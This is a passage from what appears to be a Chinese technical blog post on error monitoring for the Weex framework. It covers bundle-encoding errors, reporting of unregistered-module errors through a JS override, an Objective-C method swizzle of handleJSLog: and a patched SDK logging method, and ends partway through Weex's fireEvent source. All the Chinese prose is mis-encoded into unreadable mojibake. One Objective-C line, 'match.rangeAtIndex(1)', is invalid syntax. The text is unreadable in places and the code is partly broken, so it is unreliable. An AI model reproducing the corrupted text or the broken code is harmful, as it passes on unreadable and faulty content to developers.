<li>HTTP çŠ¶æ€ç é”™è¯¯/æ— æ•°æ®ï¼šWeex è®¤ä¸ºè¿™ç±»é”™è¯¯æ˜¯ã€Œå¤–éƒ¨ä¸å¯æ§æ•…éšœã€ï¼ˆç½‘ç»œã€CDNã€æœåŠ¡ç«¯å®•æœºï¼‰ï¼Œä¼šå½±å“å¤§æ‰¹é‡å®ä¾‹ï¼Œå±äº â€œæ¡†æ¶çº§è‡´å‘½å¼‚å¸¸â€ï¼Œå¿…é¡»é€šè¿‡ WXExceptionUtils ä¸ŠæŠ¥ï¼ˆè§¦å‘å…¨å±€å¼‚å¸¸ç»Ÿè®¡ã€å‘Šè­¦ï¼‰</li>
<li>ç¼–ç è½¬æ¢å¤±è´¥ï¼šå¯èƒ½æ˜¯åˆ†æ‰¹å¤šæ¬¡æ‰“åŒ…ï¼Œå‰å‡ æ¬¡éƒ½æ˜¯ UTF-8 æ ¼å¼ï¼Œåªæ˜¯è¿™æ¬¡ç¼–ç é”™è¯¯ï¼Œæ˜¯å¯ä»¥å®šä½çš„ã€‚Weex è®¤ä¸ºè¿™ç±»é”™è¯¯æ˜¯ã€Œå†…éƒ¨å¯æ§é—®é¢˜ã€ï¼ˆå‰ç«¯æ‰“åŒ…æ—¶æœªæŒ‰ UTF-8 è§„èŒƒè¾“å‡ºã€URL é…ç½®é”™è¯¯æŒ‡å‘äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ï¼Œå±äº â€œä¸šåŠ¡ä¾§é”™è¯¯â€ï¼Œæ¡†æ¶åªéœ€è®°å½•ç›‘æ§ï¼ˆæé†’å¼€å‘è€…ä¿®å¤ï¼‰ï¼Œæ— éœ€å‡çº§ä¸º â€œæ¡†æ¶çº§è‡´å‘½å¼‚å¸¸â€ã€‚</li>
</ul>
<p>ä½†ä»ä¸šåŠ¡æ–¹è§’åº¦å‡ºå‘ï¼Œä¸å…‰é¡µé¢æ˜¯ Weexã€Nativeã€Flutterã€H5ï¼Œåªè¦æ˜¯å½±å“äº†ç”¨æˆ·ä½“éªŒï¼Œéƒ½å±äºè‡´å‘½é—®é¢˜ï¼Œå°¤å…¶è¿™ç§æ•´ä¸ªé¡µé¢éƒ½æ˜¯ç™½å±çš„æƒ…å†µã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹æºç ï¼Œå»ä¸ŠæŠ¥è‡´å‘½å¼‚å¸¸ã€‚è°ƒç”¨ <code>WXExceptionUtils commitCriticalExceptionRT</code> çš„èƒ½åŠ›ã€‚</p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2154e2845b9049a0be6451bfb74e380e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=3BwQrPAEiMiQArQhfy%2FCp2TsDg0%3D" alt="WeexJSBundleEncodingAPM.png" loading="lazy"/></p>
<h3 data-id="heading-73">4. é€»è¾‘å¼‚å¸¸</h3>
<h4 data-id="heading-74">1. JS ä¾§ require Module å¤±è´¥</h4>
<p>åœ¨ Native <code>[WXSDKEngine registerModule:@"logicCalculation" withClass:[WXLogicCalculationModule class]]</code> æ­£å¸¸æ³¨å†Œçš„ Moduleï¼Œåå­—å« <code>logicCalculation</code>ã€‚åœ¨ js ä¾§ä½¿ç”¨çš„æ—¶å€™ä¸å°å¿ƒå†™æˆ <code>const logicCalculation = weex.requireModule('logicCalculation1')</code>ï¼Œæµ‹è¯•åˆæ²¡å›å½’åˆ°ï¼Œé—®é¢˜é€ƒé€¸åˆ°çº¿ä¸Šï¼Œå¯èƒ½å°±æ˜¯é€»è¾‘é—®é¢˜ã€‚Weex å®˜æ–¹çš„åšæ³•å°±æ˜¯åœ¨ Xcode æ‰“å° logã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23cb98cbb5e049c3acc196b1c116b623~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=l7HXLokeuQyH909ZpVlNHoO1GiM%3D" alt="WeexModuleRequireError.png" loading="lazy"/></p>
<p>æ‰€ä»¥ä½œä¸º APM ä¾§ï¼Œæˆ‘ä»¬è¦å®šä½å’Œæ”¶é›†åˆ°è¯¥é—®é¢˜ï¼Œè¿›è¡Œé—®é¢˜ä¸ŠæŠ¥ã€‚</p>
<p>æƒ³åŠæ³•çŸ¥é“å“ªé‡ŒæŠ¥é”™ï¼ŒrequireModule ä¸æ˜¯åŸç”Ÿå†™æ³•ï¼Œè¿™è‚¯å®šæ˜¯ JS ä¾§å°è£…çš„ï¼ŒæŸ¥çœ‹ Weex æºç </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1c8b35c5beb4958b0d1c0af4513e905~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=GNJIzZRV5ymObWuqAm1zU15ZEuM%3D" alt="WeexRequireModuleError.png" loading="lazy"/></p>
<pre><code class="hljs language-JS" lang="JS"><span class="hljs-comment">// Weex JS Framework æ ¸å¿ƒæºç ï¼ˆç®€åŒ–ï¼‰</span>
<span class="hljs-title class_">WeexInstance</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">requireModule</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">requireModule</span>(<span class="hljs-params">moduleName</span>) {
  <span class="hljs-comment">// 1. åŸºç¡€æ ¡éªŒï¼šWeexå®ä¾‹æ˜¯å¦æœ‰æ•ˆï¼ˆæ¯”å¦‚æ˜¯å¦å·²é”€æ¯ï¼‰</span>
  <span class="hljs-keyword">var</span> id = <span class="hljs-title function_">getId</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// è·å–å½“å‰Weexå®ä¾‹ID</span>
  <span class="hljs-keyword">if</span> (!(id &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"[JS Framework] Failed to requireModule(\""</span> + moduleName + <span class="hljs-string">"\"), instance doesn't exist."</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 2. å…³é”®æ ¡éªŒï¼šæ£€æŸ¥Moduleæ˜¯å¦åœ¨Nativeä¾§æ³¨å†Œè¿‡</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isRegisteredModule</span>(moduleName)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">"[JS Framework] using unregistered weex module \""</span> + moduleName + <span class="hljs-string">"\""</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 3. æ ¸å¿ƒï¼šåˆ›å»ºModuleä»£ç†å¯¹è±¡ï¼ˆå¹¶éçœŸå®å¯¹è±¡ï¼Œä»…å°è£…æ¡¥æ¥è°ƒç”¨ï¼‰</span>
  <span class="hljs-keyword">var</span> moduleProxy = {};
  <span class="hljs-comment">// è·å–è¯¥Moduleåœ¨Nativeä¾§æ³¨å†Œçš„æ‰€æœ‰æ–¹æ³•ï¼ˆæå‰ä»NativeåŒæ­¥åˆ°JSçš„æ–¹æ³•æ˜ å°„è¡¨ï¼‰</span>
  <span class="hljs-keyword">var</span> moduleMethods = <span class="hljs-title function_">getRegisteredMethods</span>(moduleName);
  
  <span class="hljs-comment">// 4. ä¸ºä»£ç†å¯¹è±¡ç»‘å®šæ–¹æ³•ï¼šè°ƒç”¨æ–¹æ³•æ—¶è§¦å‘JS-Nativeæ¡¥æ¥</span>
  moduleMethods.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">methodName</span>) {
    moduleProxy[methodName] = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// å°è£…è°ƒç”¨å‚æ•°ï¼šå®ä¾‹IDã€Moduleåã€æ–¹æ³•åã€å‚æ•°ã€å›è°ƒ</span>
      <span class="hljs-keyword">var</span> args = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">slice</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">arguments</span>);
      <span class="hljs-keyword">var</span> callback = <span class="hljs-literal">null</span>;
      <span class="hljs-comment">// æå–æœ€åä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒï¼ˆWeexçº¦å®šï¼‰</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> args[args.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>] === <span class="hljs-string">'function'</span>) {
        callback = args.<span class="hljs-title function_">pop</span>();
      }
      
      <span class="hljs-comment">// 5. æ ¸å¿ƒï¼šé€šè¿‡taskCenterï¼ˆæ¡¥æ¥æ ¸å¿ƒï¼‰è°ƒç”¨Native</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>.<span class="hljs-title function_">sendNative</span>(<span class="hljs-string">'callNative'</span>, {
        <span class="hljs-attr">instanceId</span>: id,
        <span class="hljs-attr">module</span>: moduleName,
        <span class="hljs-attr">method</span>: methodName,
        <span class="hljs-attr">params</span>: args,
        <span class="hljs-attr">callback</span>: callback ? <span class="hljs-title function_">generateCallbackId</span>(callback) : <span class="hljs-literal">null</span>
      });
    }.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);
  }, <span class="hljs-variable language_">this</span>);

  <span class="hljs-comment">// 6. è¿”å›ä»£ç†å¯¹è±¡ç»™JSä¾§ä½¿ç”¨</span>
  <span class="hljs-keyword">return</span> moduleProxy;
};
</code></pre>
<ul>
<li>è¿”å›çš„ä¸æ˜¯çœŸå®çš„ Module å®ä¾‹ï¼Œè€Œæ˜¯ä»£ç†å¯¹è±¡ï¼ˆProxyï¼‰ â€”â€” æ‰€æœ‰æ–¹æ³•è°ƒç”¨éƒ½ä¼šè¢«æ‹¦æˆªï¼Œè½¬è€Œé€šè¿‡æ¡¥æ¥å‘é€åˆ° Nativeï¼›</li>
<li>isRegisteredModule æ ¡éªŒï¼šJS ä¾§ä¼šç¼“å­˜ä¸€ä»½ã€ŒNative å·²æ³¨å†Œ Module åˆ—è¡¨ã€ï¼ˆNative åˆå§‹åŒ–æ—¶åŒæ­¥åˆ° JSï¼‰ï¼Œé¿å…æ— æ•ˆæ¡¥æ¥ã€‚</li>
</ul>
<p>æ–¹æ¡ˆä¸€ï¼šWeex ç”±äºå®‰å…¨è®¾è®¡ï¼Œæ²¡åŠæ³•ç›´æ¥æ³¨å…¥ JSã€‚ä¹Ÿå°±æ˜¯è¯´æƒ³é€šè¿‡â€œåˆ‡é¢â€æ€æƒ³ï¼Œhook JS ä¾§ requireModule æ˜¯è¡Œä¸é€šçš„ã€‚è¿™ç§æ–¹æ¡ˆï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs language-JS" lang="JS"><span class="hljs-comment">// å¤‡ä»½åŸç”ŸrequireModuleæ–¹æ³•</span>
<span class="hljs-keyword">const</span> originalRequireModule = <span class="hljs-title class_">WeexInstance</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">requireModule</span>;

<span class="hljs-comment">// é‡å†™requireModuleï¼Œåœ¨é”™è¯¯è§¦å‘æ—¶ä¸»åŠ¨ä¸ŠæŠ¥Native</span>
<span class="hljs-title class_">WeexInstance</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">requireModule</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">moduleName</span>) {
  <span class="hljs-comment">// å…ˆæ‰§è¡ŒåŸç”Ÿåˆ¤æ–­é€»è¾‘</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">getId</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-keyword">if</span> (!(id &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>)) {
    <span class="hljs-keyword">const</span> errorMsg = <span class="hljs-string">"[JS Framework] Failed to requireModule(\""</span> + moduleName + <span class="hljs-string">"\"), instance ("</span> + id + <span class="hljs-string">") doesn't exist anymore."</span>;
    <span class="hljs-comment">// ä¸»åŠ¨ä¸ŠæŠ¥â€œå®ä¾‹ä¸å­˜åœ¨â€é”™è¯¯åˆ°Native</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>.<span class="hljs-title function_">sendNative</span>(<span class="hljs-string">'__weex_apm_report'</span>, {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'module_require_failed'</span>,
      <span class="hljs-attr">subType</span>: <span class="hljs-string">'instance_not_exist'</span>,
      <span class="hljs-attr">moduleName</span>: moduleName,
      <span class="hljs-attr">message</span>: errorMsg,
      <span class="hljs-attr">instanceId</span>: id
    });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(errorMsg);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// æ ¸å¿ƒï¼šæ‹¦æˆªâ€œæœªæ³¨å†ŒModuleâ€åˆ¤æ–­</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isRegisteredModule</span>(moduleName)) {
    <span class="hljs-keyword">const</span> warnMsg = <span class="hljs-string">"[JS Framework] using unregistered weex module \""</span> + moduleName + <span class="hljs-string">"\""</span>;
    <span class="hljs-comment">// ä¸»åŠ¨ä¸ŠæŠ¥â€œModuleæœªæ³¨å†Œâ€é”™è¯¯åˆ°Nativeï¼ˆå…³é”®ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">document</span>.<span class="hljs-property">taskCenter</span>.<span class="hljs-title function_">sendNative</span>(<span class="hljs-string">'__weex_apm_report'</span>, {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'module_not_registered'</span>,
      <span class="hljs-attr">moduleName</span>: moduleName,
      <span class="hljs-attr">message</span>: warnMsg,
      <span class="hljs-attr">instanceId</span>: id,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
    });
    <span class="hljs-comment">// ä¿ç•™åŸç”Ÿwarnæ—¥å¿—ï¼ˆä¸å½±å“åŸæœ‰é€»è¾‘ï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(warnMsg);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// æ‰§è¡ŒåŸç”Ÿé€»è¾‘</span>
  <span class="hljs-keyword">return</span> originalRequireModule.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, moduleName);
};
</code></pre>
<p>æ–¹æ¡ˆäºŒï¼šNative ä¾§æ‹¦æˆª JS çš„ console.warn è°ƒç”¨ï¼ˆæ—  JS ä¾µå…¥ï¼‰</p>
<p>å†™æ³•1ï¼šWeex JS ä¾§çš„ <code>console.warn</code> æœ€ç»ˆä¼šé€šè¿‡ WXBridgeContext çš„ <code>handleJSLog</code> æ–¹æ³•ä¼ é€’åˆ° Nativeï¼Œæ— éœ€è§£ææœ€ç»ˆæ—¥å¿—ï¼Œç›´æ¥ Hook è¯¥æ–¹æ³•æ‹¦æˆª warn ä¿¡æ¯ï¼Œç²¾å‡†åŒ¹é… Module æœªæ³¨å†Œé”™è¯¯</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">#import &lt;objc/runtime.h&gt;

@implementation NSObject (WXJSLogHook)
+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&amp;onceToken, ^{
        // è·å–WXBridgeContextç±»ï¼ˆæ— éœ€å¤´æ–‡ä»¶ï¼‰
        Class bridgeContextClass = NSClassFromString(@"WXBridgeContext");
        if (!bridgeContextClass) return;
        
        // Hookå¤„ç†JSæ—¥å¿—çš„æ ¸å¿ƒæ–¹æ³•ï¼šhandleJSLog:
        SEL handleJSLogSel = NSSelectorFromString(@"handleJSLog:");
        Method originalMethod = class_getInstanceMethod(bridgeContextClass, handleJSLogSel);
        if (!originalMethod) return;
        
        SEL swizzledSel = NSSelectorFromString(@"weex_apm_handleJSLog:");
        Method swizzledMethod = class_getInstanceMethod(self, swizzledSel);
        class_addMethod(bridgeContextClass, swizzledSel, method_getImplementation(swizzledMethod), method_getTypeEncoding(swizzledMethod));
        method_exchangeImplementations(originalMethod, swizzledMethod);
    });
}

// Hookåçš„handleJSLogæ–¹æ³•ï¼šæ‹¦æˆªJSä¾§çš„warnæ—¥å¿—
- (void)weex_apm_handleJSLog:(NSDictionary *)logInfo {
    // 1. å…ˆæ‰§è¡ŒåŸæ–¹æ³•ï¼Œä¿ç•™åŸæœ‰æ—¥å¿—è¾“å‡ºé€»è¾‘
    [self weex_apm_handleJSLog:logInfo];
    
    // 2. è§£æJSæ—¥å¿—ä¿¡æ¯ï¼ˆlogInfoæ ¼å¼ï¼š{level: 'warn', msg: 'xxx', ...}ï¼‰
    NSString *logLevel = logInfo[@"level"];
    NSString *logMsg = logInfo[@"msg"];
    
    // 3. ç²¾å‡†åŒ¹é…â€œæœªæ³¨å†ŒModuleâ€çš„warn
    if ([logLevel isEqualToString:@"warn"] &amp;&amp; [logMsg containsString:@"using unregistered weex module"]) {
        // æå–Moduleåç§°
        NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"using unregistered weex module \"(.*?)\"" options:0 error:nil];
        NSTextCheckingResult *match = [regex firstMatchInString:logMsg options:0 range:NSMakeRange(0, logMsg.length)];
        NSString *moduleName = match ? [logMsg substringWithRange:match.rangeAtIndex(1)] : @"";
        
        // 4. æ„é€ APMæ•°æ®ä¸ŠæŠ¥
        NSDictionary *apmData = @{
            @"error_type": @"weex_module_not_registered",
            @"module_name": moduleName,
            @"message": logMsg,
            @"source": @"js_console_warn", // æ ‡è®°æ¥æºï¼šJS console.warn
            @"timestamp": @([[NSDate date] timeIntervalSince1970] * 1000)
        };
        
        // è°ƒç”¨ APM SDK æ¥å£ï¼Œæ•°æ®å…ˆè½åº“ï¼Œåç»­ç»Ÿä¸€æŒ‰ç…§æ•°æ®ä¸ŠæŠ¥ç­–ç•¥ï¼Œä»æœ¬åœ° DB æå–ã€èšåˆã€ä¸ŠæŠ¥
        // [YourAPMManager reportWeexError:apmData];
    }
}
@end
</code></pre>
<p>æ ¸å¿ƒä¼˜åŠ¿</p>
<ul>
<li>æ— ä¾µå…¥ï¼šæ— éœ€ä¿®æ”¹ / æ³¨å…¥ JS ä»£ç ï¼Œçº¯ Native ä¾§å®ç°ï¼›</li>
<li>ç²¾å‡†ï¼šæ‹¦æˆªçš„æ˜¯ JS ä¾§ä¼ é€’åˆ° Native çš„åŸå§‹æ—¥å¿—æ•°æ®ï¼ˆè€Œéæœ€ç»ˆæ‰“å°çš„å­—ç¬¦ä¸²ï¼‰ï¼Œæ— æ ¼å¼è¯¯å·®ï¼›</li>
<li>è¦†ç›–å…¨ï¼šæ‰€æœ‰ JS ä¾§çš„console.warnéƒ½ä¼šç»è¿‡æ­¤æ–¹æ³•ï¼Œ100% è¦†ç›– Module æœªæ³¨å†Œåœºæ™¯</li>
</ul>
<p>å†™æ³•äºŒï¼šç”±äº Weex ä»£ç æ˜¯å¤§é‡çš„å­˜é‡ä¸šåŠ¡ä»£ç ï¼Œå¾ˆç¨³å®šã€‚è€Œä¸” Weex å®˜æ–¹å¥½å‡ å¹´ä¸æ›´æ–°ï¼Œæ‰€ä»¥æˆ‘ä»¬å†…éƒ¨ç§æœ‰åŒ– Weex SDKï¼Œä¹Ÿå°±æ²¡æœ‰é‡‡å– Hook æ‰‹æ®µã€‚è€Œæ˜¯ç›´æ¥ä¿®æ”¹æºç ï¼Œ<code>WXBridgeContext.m</code> çš„ <code>+ (void)handleConsoleOutputWithArgument:(NSArray *)arguments logLevel:(WXLogFlag)logLevel</code> æ–¹æ³•ã€‚æ¯”å¦‚ï¼š</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">+ (void)handleConsoleOutputWithArgument:(NSArray *)arguments logLevel:(WXLogFlag)logLevel
{
    NSMutableString *string = [NSMutableString string];
    [string appendString:@"jsLog: "];
    [arguments enumerateObjectsUsingBlock:^(JSValue *jsVal, NSUInteger idx, BOOL *stop) {
        [string appendFormat:@"%@ ", jsVal];
        if (idx == arguments.count - 1) {
            if (logLevel) {
                if (WXLogFlagWarning == logLevel || WXLogFlagError == logLevel) {
                    if ([string containsString:@"using unregistered weex module"]) {
                        // æå–Moduleåç§°
                        NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"using unregistered weex module \"(.*?)\"" options:0 error:nil];
                        NSTextCheckingResult *match = [regex firstMatchInString:string options:0 range:NSMakeRange(0, string.length)];
                        NSString *moduleName = match ? [string substringWithRange:[match rangeAtIndex:1]] : @"";
                        
                        // æ¥å…¥æ”¶å£å·¥å…·ç±»
                        NSString *exceptionMsg = [NSString stringWithFormat:@"JS requireæœªæ³¨å†Œæ¨¡å—ï¼š%@ï¼ŒåŸå§‹æ—¥å¿—ï¼š%@", moduleName, string];
                        NSDictionary *customExt = @{@"moduleName": moduleName};
                        NSString *instanceId = [WXSDKEngine topInstance].instanceId ?: @"";
                        NSString *bundleUrl = [WXSDKEngine topInstance].scriptURL.absoluteString ?: @"";
                        [[WXExceptionReporter sharedInstance] reportExceptionWithCode:WXCustomExceptionCode_Module_NotRegistered
                                                                        exceptionType:WXCustomExceptionType_Module
                                                                            instanceId:instanceId
                                                                             function:@"handleConsoleOutputWithArgument:logLevel:"
                                                                         exceptionMsg:exceptionMsg
                                                                            bundleUrl:bundleUrl
                                                                         customExtParams:customExt];
                    }
                    
                    id&lt;WXAppMonitorProtocol&gt; appMonitorHandler = [WXSDKEngine handlerForProtocol:@protocol(WXAppMonitorProtocol)];
                    if ([appMonitorHandler respondsToSelector:@selector(commitAppMonitorAlarm:monitorPoint:success:errorCode:errorMsg:arg:)]) {
                        [appMonitorHandler commitAppMonitorAlarm:@"weex" monitorPoint:@"jswarning" success:NO errorCode:@"99999" errorMsg:string arg:[WXSDKEngine topInstance].pageName];
                    }
                }
                WX_LOG(logLevel, @"%@", string);
            } else {
                [string appendFormat:@"%@ ", jsVal];
                WXLogInfo(@"%@", string);
            }
        }
    }];
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/feaa4cd760594fb0bf97f43cff8d8778~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=CzPMJNi1rHB2uiQkqsrjsWjl49M%3D" alt="WeexRequireModuleErrorAPM.png" loading="lazy"/></p>
<h4 data-id="heading-75">2. JS è°ƒç”¨ Moudle æ–¹æ³•å¤±è´¥</h4>
<p>Native æ³¨å†Œäº†ä¸€ä¸ªè´Ÿè´£é€»è¾‘çš„ Moduleï¼Œä½†æ˜¯åœ¨ JS ä¾§ä½¿ç”¨çš„æ—¶å€™ï¼Œè¦ä¹ˆæ–¹æ³•åå†™é”™äº†ï¼Œè¦ä¹ˆå‚æ•°å°‘ä¼ äº†ï¼Œéƒ½å¯èƒ½å¯¼è‡´é¢„æœŸçš„é€»è¾‘æ‰§è¡Œé”™è¯¯ï¼Œå‘ç”Ÿä¸ç¬¦åˆé¢„æœŸçš„è¡Œä¸ºã€‚</p>
<h5 data-id="heading-76">1. ç‚¹å‡»äº‹ä»¶å·¥ä½œåŸç†</h5>
<p>æ ¸å¿ƒé—®é¢˜ï¼šç‚¹å‡»äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¦‚ä½•æ ¹æ® Component çš„ç‚¹å‡»äº‹ä»¶å®šä½åˆ°è¯¥ Component åœ¨ Vue DSL ä¸­å£°æ˜çš„äº‹ä»¶ï¼Ÿ</p>
<p>ç¬¬ä¸€æ­¥ï¼šé¡µé¢åˆå§‹åŒ–æ—¶ï¼ŒJS ä¾§æ„å»º<strong>äº‹ä»¶æ˜ å°„è¡¨</strong>ã€‚
Weex é¡µé¢æ¸²æŸ“æ—¶ï¼Œä¼šä¸ºæ¯ä¸ªç»„ä»¶åš2ä»¶äº‹æƒ…ï¼š</p>
<ul>
<li>ç”Ÿæˆç»„ä»¶å”¯ä¸€æ ‡è¯†ï¼šæ¯ä¸ªç»„ä»¶éƒ½æœ‰ <code>ref/componentId/docId</code>ï¼Œç±»ä¼¼ç»„ä»¶èº«ä»½è¯</li>
<li>ç»‘å®šäº‹ä»¶ä¸æ–¹æ³•ï¼šè§£æ <code>@click="handleButtonClick"</code> æ—¶ï¼ŒJS ä¼šå°†ã€Œç»„ä»¶ ID + äº‹ä»¶ç±»å‹ï¼ˆclickï¼‰ã€ä½œä¸º keyï¼Œ<code>handleButtonClick</code> ä½œä¸º valueï¼Œä¸€èµ·å­˜è¿›ç»„ä»¶å®ä¾‹çš„æ˜ å°„è¡¨é‡Œï¼Œï¼ˆå¯¹åº”ä¸‹é¢çš„ <code>this.event[type]</code>ï¼‰</li>
</ul>
<p>ç¬¬äºŒæ­¥ï¼šNative ä¾§æ•è·ç‚¹å‡»ï¼Œæºå¸¦å…³é”®ä¿¡æ¯è°ƒç”¨ fireEventã€‚
Native ä¾§èƒ½æ‹¿åˆ° componentIdï¼Œæ˜¯å› ä¸ºæ¸²æŸ“ç»„ä»¶æ—¶ï¼ŒJS ä¾§ä¼šæŠŠç»„ä»¶ ID åŒæ­¥ç»™ Native æ¸²æŸ“å¼•æ“ï¼ˆWXComponentï¼‰ï¼ŒNative æ§ä»¶å’Œ JS ç»„ä»¶å®ä¾‹é€šè¿‡ ID ä¸€ä¸€ç»‘å®š</p>
<p>ç¬¬ä¸‰æ­¥ï¼šJS ä¾§è°ƒç”¨ <code>fireEvent</code> æ–¹æ³•ï¼Œå…¶å†…éƒ¨é€šè¿‡ <code>ID + äº‹ä»¶ç±»å‹</code> æ‰¾æ–¹æ³•ã€‚</p>
<ul>
<li>å®šä½ç»„ä»¶å®ä¾‹ï¼šJS é€šè¿‡ componentIDï¼ˆä»£ç é‡Œçš„ this.refï¼‰æ‰¾åˆ°ç»„ä»¶å®ä¾‹ã€‚</li>
<li>æŸ¥æ‰¾äº‹ä»¶æ˜ å°„ï¼šä»ç»„ä»¶å®ä¾‹çš„ <code>this.event</code> é‡Œæ ¹æ® type ï¼ˆå¦‚ clickï¼‰æ‰¾åˆ°å…·ä½“çš„ eventDescï¼ˆåŒ…å«å…·ä½“çš„ handlerï¼‰</li>
<li>å‘èµ·è°ƒç”¨ <code>handler.call</code></li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
   * Fire an event manually.
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} type type
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">function</span>} event handler
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">boolean</span>} isBubble whether or not event bubble
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">boolean</span>} <span class="hljs-variable">options</span>
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type"/>} anything returned by handler function
   */</span>
  <span class="hljs-title class_">Element</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">fireEvent</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">fireEvent</span> (type, event, isBubble, options) {
    <span class="hljs-keyword">var</span> result = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">var</span> isStopPropagation = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">var</span> eventDesc = <span class="hljs-variable language_">this</span>.<span class="hljs-property">event</span>[type];
    <span class="hljs-keyword">if</span> (eventDesc &amp;&amp; event) {
      <span class="hljs-keyword">var</span> handler = eventDesc.<span class="hljs-property">handler</span>;
      event.<span class="hljs-property">stopPropagation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        isStopPropagation = <span class="hljs-literal">true</span>;
      };
      <span class="hljs-keyword">if</span> (options &amp;&amp; options.<span class="hljs-property">params</span>) {
        result = handler.<span class="hljs-property">call</span>.<span class="hljs-title function_">apply</span>(handler, [ <span class="hljs-variable language_">this</span> ].<span class="hljs-title function_">concat</span>( options.<span class="hljs-property">params</span>, [event] ));
      }
      <span class="hljs-keyword">else</span> {
        result = handler.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, event);
      }
    }

    <span class="hljs-keyword">if</span> (!isStopPropagation
      &amp;&amp; isBubble
      &amp;&amp; (<span class="hljs-variable constant_">BUBBLE_EVENTS</span>.<span class="hljs-title function_">indexOf</span>(type) !== -<span class="hljs-number">1</span>)
      &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentNode</span>
      &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentNode</span>.<span class="hljs-property">fireEvent</span>) {
      event.<span class="hljs-property">currentTarget</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentNode</span>;
